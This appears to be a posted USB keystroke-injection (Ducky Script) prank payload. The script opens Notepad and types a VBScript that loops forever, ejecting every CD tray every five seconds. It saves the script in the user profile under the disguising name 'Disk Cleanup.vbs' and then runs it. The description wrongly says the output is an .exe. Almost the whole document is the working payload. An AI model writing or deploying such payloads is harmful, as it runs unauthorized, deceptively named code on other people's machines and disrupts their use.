Author: Windy42

Description: This will make an .exe that will open the disk tray over and over again.

Note: I do not take all credit for writing this, the prank has been written many times I just converted it into a Payload.

```
GUI d
DELAY 300
GUI r
STRING notepad
ENTER
DELAY 100
STRING Set oWMP = CreateObject("WMPlayer.OCX.7")
ENTER
STRING Set colCDROMs = oWMP.cdromCollection
ENTER
STRING do
ENTER
STRING if colCDROMs >= 1 then
ENTER
STRING For i = 0 to colCDROMs.Count - 1
ENTER
STRING colCDROMs.Item(i).Eject
ENTER
STRING Next
ENTER
STRING End If
ENTER
STRING wscript.sleep 5000
ENTER
STRING loop
DELAY 200
CTRL s
DELAY 100
STRING %userprofile%\Disk Cleanup.vbs
ENTER
DELAY 200
ALT F4
DELAY 100
GUI d
DELAY 100
GUI r
STRING Disk Cleanup.vbs
ENTER
```